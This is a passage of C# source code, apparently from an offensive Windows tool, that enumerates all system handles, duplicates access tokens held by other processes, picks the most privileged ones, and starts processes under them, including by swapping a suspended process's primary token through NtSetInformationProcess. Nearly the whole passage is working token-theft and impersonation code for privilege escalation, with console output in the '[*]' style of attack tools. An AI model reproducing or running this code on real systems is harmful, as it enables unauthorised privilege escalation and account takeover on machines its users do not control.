            IntPtr tokenInfo = IntPtr.Zero;
            uint dwLength;
            int num = -1;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevationType, out tokenInfo, out dwLength))
            {
                num = Marshal.ReadInt32(tokenInfo);
                Marshal.FreeHGlobal(tokenInfo);

            }
            return (TOKEN_ELEVATION_TYPE)Enum.ToObject(typeof(TOKEN_ELEVATION_TYPE), num);
        }
        public static TokenImpersonationLevel GetImpersonationLevel(IntPtr tokenHandle)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint dwLength = 0;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, out tokenInfo, out dwLength))
            {
                int num = Marshal.ReadInt32(tokenInfo);
                Marshal.FreeHGlobal(tokenInfo);
                return num + TokenImpersonationLevel.Anonymous;
            }
            return TokenImpersonationLevel.None;
        }
        public static string GetAuthenticationType(IntPtr tokenHandle, out uint sessionId, out string logonDomain, out SECURITY_LOGON_TYPE logonType)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint dwLength = 0;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenStatistics, out tokenInfo, out dwLength))
            {
                TOKEN_STATISTICS tokenStatistics = (TOKEN_STATISTICS)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_STATISTICS));
                Marshal.FreeHGlobal(tokenInfo);
                LUID logonAuthId = tokenStatistics.AuthenticationId;
                if (logonAuthId.LowPart == 998U)
                {
                    goto failRet;
                }
                IntPtr ppLogonSessionData = IntPtr.Zero;
                uint status = NativeMethod.LsaGetLogonSessionData(ref logonAuthId, ref ppLogonSessionData);
                if (status == NativeMethod.STATUS_SUCCESS)
                {
                    SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(SECURITY_LOGON_SESSION_DATA));
                    string result = sessionData.AuthenticationPackage.ToString();
                    logonType = (SECURITY_LOGON_TYPE)sessionData.LogonType;
                    sessionId = sessionData.Session;
                    logonDomain = sessionData.LogonDomain.ToString();
                    NativeMethod.LsaFreeReturnBuffer(ppLogonSessionData);
                    return result;
                }

            }
        failRet:
            logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;
            sessionId = 0;
            logonDomain = "UnKnown";
            return "UnKnown";
        }
        public static IntegrityLevel GetTokenIntegrityLevel(IntPtr tokenHanle)
        {
            IntPtr infoPtr = IntPtr.Zero;
            uint dwLength;
            uint IntegrityLevel = 0;
            if (NativeMethod.GetTokenInformation(tokenHanle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, out infoPtr, out dwLength))
            {
                TOKEN_MANDATORY_LABEL tokenMandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(infoPtr, typeof(TOKEN_MANDATORY_LABEL));
                IntPtr SubAuthorityCount = NativeMethod.GetSidSubAuthorityCount(tokenMandatoryLabel.Label.Sid);

                IntPtr IntegrityLevelRidPtr = NativeMethod.GetSidSubAuthority(tokenMandatoryLabel.Label.Sid, (uint)Marshal.ReadInt32(SubAuthorityCount) - 1);
                uint IntegrityLevelRid = (uint)Marshal.ReadInt32(IntegrityLevelRidPtr);
                Array integrityLevels = Enum.GetValues(typeof(IntegrityLevel));

                for (int i = 0; i < integrityLevels.Length; i++)
                {
                    uint tmpRid = (uint)integrityLevels.GetValue(i);
                    if (IntegrityLevelRid >= tmpRid)
                    {
                        IntegrityLevel = tmpRid;
                    }
                    else
                    {
                        break;
                    }
                }
                Marshal.FreeHGlobal(infoPtr);

            }
            return (IntegrityLevel)Enum.ToObject(typeof(IntegrityLevel), IntegrityLevel);
        }

        public static bool GetTokenUIAccess(IntPtr tokenHandle)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint outLength = 0;
            bool isTokenUIAccess = false;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUIAccess, out tokenInfo, out outLength))
            {
                if (Marshal.ReadByte(tokenInfo) != 0)
                {
                    isTokenUIAccess = true;
                }

                Marshal.FreeHGlobal(tokenInfo);
            }
            return isTokenUIAccess;
        }
        public bool CreateProcess(string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)
        {

            IntPtr tmpTokenHandle = IntPtr.Zero;
            if (NativeMethod.DuplicateTokenEx(this.TokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, this.ImpersonationLevel, TOKEN_TYPE.TokenPrimary,
                out tmpTokenHandle))
            {
                NativeMethod.CloseHandle(this.TokenHandle);
                this.TokenHandle = tmpTokenHandle;
            }
            else
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            }

            NativeMethod.SetLastError(0);



            //The TokenHandle of CreateProcessWithTokenW must have TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID permissions

            if (NativeMethod.CreateProcessWithTokenW(this.TokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,
        out processInformation))
            {
                return true;
            }


            if (NativeMethod.CreateProcessAsUserW(this.TokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags
                                , IntPtr.Zero, null, ref startupinfo, out processInformation))
            {
                return true;
            }
            else if (Marshal.GetLastWin32Error() == 1314)
            {
                uint newDwCreationFlags = dwCreationFlags | (uint)ProcessCreateFlags.CREATE_SUSPENDED;
                newDwCreationFlags |= (uint)ProcessCreateFlags.CREATE_UNICODE_ENVIRONMENT;
                if (NativeMethod.CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, newDwCreationFlags, IntPtr.Zero, null, ref startupinfo, out processInformation))
                {
                    //init PROCESS_ACCESS_TOKEN
                    uint PROCESS_ACCESS_TOKEN_SIZE = (uint)Marshal.SizeOf(typeof(PROCESS_ACCESS_TOKEN));
                    PROCESS_ACCESS_TOKEN processAccessToken = new PROCESS_ACCESS_TOKEN();
                    IntPtr tokenInfoPtr = Marshal.AllocHGlobal((int)PROCESS_ACCESS_TOKEN_SIZE);
                    processAccessToken.Token = this.TokenHandle;
                    processAccessToken.Thread = processInformation.hThread;
                    Marshal.StructureToPtr(processAccessToken, tokenInfoPtr, false);

                    uint status = NativeMethod.NtSetInformationProcess(processInformation.hProcess, PROCESS_INFORMATION_CLASS.ProcessAccessToken, tokenInfoPtr, PROCESS_ACCESS_TOKEN_SIZE);
                    Marshal.FreeHGlobal(tokenInfoPtr);
                    if (status == NativeMethod.STATUS_SUCCESS)
                    {

                        if ((dwCreationFlags & (uint)ProcessCreateFlags.PROFILE_USER) == 0)
                        {
                            if (NativeMethod.NtResumeProcess(processInformation.hProcess) != NativeMethod.STATUS_SUCCESS)
                            {
                                NativeMethod.CloseHandle(processInformation.hThread);
                                NativeMethod.CloseHandle(processInformation.hProcess);
                                NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);
                                processInformation.hProcess = IntPtr.Zero;
                                processInformation.hThread = IntPtr.Zero;
                                return false;
                            }
                        }
                        return true;
                    }
                    else
                    {
                        NativeMethod.CloseHandle(processInformation.hThread);
                        NativeMethod.CloseHandle(processInformation.hProcess);
                        NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);
                        processInformation.hProcess = IntPtr.Zero;
                        processInformation.hThread = IntPtr.Zero;
                    }
                }
            }

            return false;
        }
        public void Close()
        {
            if (this.TokenHandle != IntPtr.Zero && !IsClose)
            {
                IsClose = true;
                NativeMethod.CloseHandle(this.TokenHandle);
                this.TokenHandle = IntPtr.Zero;
            }
        }

        public bool ImpersonateLoggedOnUser()
        {
            if (!IsClose && TokenHandle != IntPtr.Zero)
            {
                return NativeMethod.ImpersonateLoggedOnUser(this.TokenHandle);
            }

            return false;
        }

    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
    { // Information Class 64
        public IntPtr ObjectPointer;
        public IntPtr ProcessID;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTrackIndex;
        public ushort ObjectType;
        public uint HandleAttributes;
        public uint Reserved;
    }

    public class TokenuUils
    {
        private static readonly int tokenType = getTokenType();


        public static bool tryAddTokenPriv(IntPtr token, string privName)
        {
            TokenPrivileges tokenPrivileges = new TokenPrivileges();
            if (NativeMethod.LookupPrivilegeValue(null, privName, out tokenPrivileges.Luid))
            {

                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.Attributes = NativeMethod.SE_PRIVILEGE_ENABLED;
                int ReturnLength = 0;
                NativeMethod.SetLastError(0);
                NativeMethod.AdjustTokenPrivileges(token, false, tokenPrivileges, 0, IntPtr.Zero, out ReturnLength);
                if (Marshal.GetLastWin32Error() == NativeMethod.ERROR_SUCCESS)
                {
                    return true;
                }
            }
            return false;
        }
        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] ListSystemHandle()
        {

            List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> result = new List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();
            uint handleInfoSize = 1024 * 1024;
            IntPtr handleInfoPtr = Marshal.AllocHGlobal((int)handleInfoSize);
            uint returnSize = 0;
            uint status = 0;
            while ((status = NativeMethod.NtQuerySystemInformation(NativeMethod.SystemExtendedHandleInformation, handleInfoPtr, handleInfoSize, out returnSize)) ==
                NativeMethod.STATUS_INFO_LENGTH_MISMATCH)
            {
                Marshal.FreeHGlobal(handleInfoPtr);
                handleInfoPtr = Marshal.AllocHGlobal(new IntPtr(handleInfoSize *= 2));
            }
            if (status != NativeMethod.STATUS_SUCCESS)
            {
                //Console.WriteLine("NtQuerySystemInformation调用失败 ErrCode:" + Marshal.GetLastWin32Error());
                goto ret;
            }
            _SYSTEM_HANDLE_INFORMATION_EX handleInfo = (_SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(_SYSTEM_HANDLE_INFORMATION_EX));

            uint NumberOfHandles = handleInfo.GetNumberOfHandles();
            for (uint i = 0; i < NumberOfHandles; i++)
            {
                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = _SYSTEM_HANDLE_INFORMATION_EX.HandleAt(handleInfoPtr, i);
                result.Add(handleEntry);
            }
        ret:
            Marshal.FreeHGlobal(handleInfoPtr);
            return result.ToArray();
        }
        public static int getTokenType()
        {
            int ret = -1;
            Process currentProcess = Process.GetCurrentProcess();
            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
            IntPtr currentThreadToken = windowsIdentity.Token;
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] handles = TokenuUils.ListSystemHandle();
            for (int i = 0; i < handles.Length; i++)
            {
                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handles[i];
                if (handleEntry.ProcessID.ToInt64() == currentProcess.Id && currentThreadToken == handleEntry.HandleValue)
                {
                    ret = handleEntry.ObjectType;
                    goto ret;
                }
            }
        ret:
            windowsIdentity.Dispose();
            currentProcess.Dispose();
            return ret;
        }

        public delegate bool ListProcessTokensCallback(ProcessToken processToken);

        public static bool ListProcessTokensDefaultCallback(ProcessToken processToken)
        {
            return true;
        }

        public static ProcessToken[] ListProcessTokens(int targetPid, ListProcessTokensCallback listProcessTokensCallback)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] shteis = ListSystemHandle();
            List<ProcessToken> processTokens = new List<ProcessToken>();
            IntPtr localProcessHandle = NativeMethod.GetCurrentProcess();
            IntPtr processHandle = IntPtr.Zero;
            int lastPid = -1;
            for (int i = 0; i < shteis.Length; i++)
            {

                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntryInfo = shteis[i];
                int handleEntryPid = (int)handleEntryInfo.ProcessID.ToInt64();
                if (targetPid > 0 && handleEntryPid == targetPid //过滤进程PID
                    || targetPid <= 0//如果小于等于0就不过滤
                    )
                {

                    if (lastPid != handleEntryPid)
                    {
                        if (processHandle != IntPtr.Zero)
                        {
                            NativeMethod.CloseHandle(processHandle);
                            processHandle = IntPtr.Zero;
                        }

                        processHandle = NativeMethod.OpenProcess(ProcessAccessFlags.DuplicateHandle | ProcessAccessFlags.QueryInformation, false, handleEntryPid);

                        if (processHandle != IntPtr.Zero)
                        {
                            IntPtr processToken = IntPtr.Zero;
                            if (NativeMethod.OpenProcessToken(processHandle, NativeMethod.TOKEN_ELEVATION, out processToken))
                            {
                                ProcessToken token = ProcessToken.Cast(IntPtr.Zero, handleEntryPid, processHandle, processToken);
                                if (token != null)
                                {
                                    if (listProcessTokensCallback.Invoke(token))
                                    {
                                        PutToken(processTokens, token);
                                    }
                                    else
                                    {
                                        token.Close();
                                        goto end;
                                    }
                                }
                            }
                        }
                        lastPid = handleEntryPid;

                    }

                    if (processHandle == IntPtr.Zero)
                    {
                        continue;
                    }

                    //GrantedAccess 0x0012019f 有可能会导致堵塞
                    if (handleEntryInfo.ObjectType != tokenType || handleEntryInfo.GrantedAccess == 0x0012019f)
                    {
                        continue;
                    }

                    IntPtr dupHandle = IntPtr.Zero;
                    if (NativeMethod.DuplicateHandle(processHandle, handleEntryInfo.HandleValue, localProcessHandle, out dupHandle,
                            NativeMethod.GENERIC_EXECUTE | NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE, false, 0))
                    {

                        ProcessToken token = ProcessToken.Cast(handleEntryInfo.HandleValue, handleEntryPid, processHandle, dupHandle);
                        if (token != null)
                        {
                            if (listProcessTokensCallback.Invoke(token))
                            {
                                PutToken(processTokens, token);
                            }
                            else
                            {
                                token.Close();
                                goto end;
                            }
                        }
                    }


                    lastPid = handleEntryPid;
                }
            }

        end:
            if (processHandle != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(processHandle);
            }
            NativeMethod.CloseHandle(localProcessHandle);
            return processTokens.ToArray();
        }
        private static void PutToken(List<ProcessToken> list, ProcessToken processToken)
        {

            if (processToken == null)
            {
                return;
            }


            for (int i = 0; i < list.Count; i++)
            {
                ProcessToken processTokenNode = list[i];
                if (processTokenNode.UserName == processToken.UserName)
                {
                    if (processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel ||
                        (processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel && (processToken.TokenElevationType == TOKEN_ELEVATION_TYPE.TokenElevationTypeFull || processToken.IntegrityLevel > processTokenNode.IntegrityLevel)))
                    {
                        if (!processToken.IsRestricted)
                        {
                            processTokenNode.Close();
                            list[i] = processToken;
                        }
                    }
                    else
                    {
                        processToken.Close();
                    }
                    return;
                }
            }
            list.Add(processToken);

        }


        public static bool CreateProcess(IntPtr tokenHandle, string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)
        {
            TOKEN_TYPE tokenType = ProcessToken.GetTokenType(tokenHandle);
            bool isClose = false;
            bool isCreate = false;
            if (tokenType != TOKEN_TYPE.TokenPrimary)
            {
                IntPtr tmpTokenHandle = IntPtr.Zero;
                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenPrimary,
                    out tmpTokenHandle))
                {
                    isClose = true;
                    tokenHandle = tmpTokenHandle;
                }
            }

            if (NativeMethod.CreateProcessAsUserW(tokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags
        , IntPtr.Zero, null, ref startupinfo, out processInformation))
            {
                isCreate =  true;
            }else if (NativeMethod.CreateProcessWithTokenW(tokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,
                out processInformation))
            {
                isCreate =  true;
            }

            if (isClose)
            {
                NativeMethod.CloseHandle(tokenHandle);
            }

            return isCreate;

        }
        public static void createProcessReadOut(TextWriter consoleWriter, IntPtr tokenHandle, string commandLine)
        {
            IntPtr childProcessStdOutRead = IntPtr.Zero;
            IntPtr childProcessStdOutWrite = IntPtr.Zero;

            FileStream childProcessReadStream = null;

            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

            //初始化安全属性
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();

            securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            securityAttributes.pSecurityDescriptor = IntPtr.Zero;
            securityAttributes.bInheritHandle = true;

            //初始化子进程输出

            if (!NativeMethod.CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                    ref securityAttributes, 8196))
            {
                goto end;
            }


            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            startupInfo.hStdError = childProcessStdOutWrite;
            startupInfo.hStdOutput = childProcessStdOutWrite;
            startupInfo.hStdInput = IntPtr.Zero;
            startupInfo.dwFlags = (int)NativeMethod.STARTF_USESTDHANDLES;

            NativeMethod.SetHandleInformation(childProcessStdOutRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
            NativeMethod.SetHandleInformation(childProcessStdOutWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);



            if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                    out processInformation))
            {
                consoleWriter.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");

                NativeMethod.CloseHandle(childProcessStdOutWrite);
                childProcessStdOutWrite = IntPtr.Zero;

                childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);

                byte[] readBytes = new byte[4096];
                uint bytesAvail = 0;
                uint BytesLeftThisMessage = 0;
                uint bytesRead = 0;
                int read = 0;

                while (true)
                {
                    if (!NativeMethod.PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,
                        ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))
                    {
                        break;
                    }

                    if (bytesAvail > 0)
                    {
                        read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                        consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));
                    }

                }


            }
            else
            {
                consoleWriter.WriteLine($"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
            }
        end:
            if (childProcessReadStream != null)
            {
                childProcessReadStream.Close();
            }
            if (processInformation.hProcess != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(processInformation.hProcess);
            }
            if (processInformation.hThread != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(processInformation.hThread);
            }
            if (childProcessStdOutRead != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(childProcessStdOutRead);
            }
            if (childProcessStdOutWrite != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(childProcessStdOutWrite);
            }
        }


    }



}
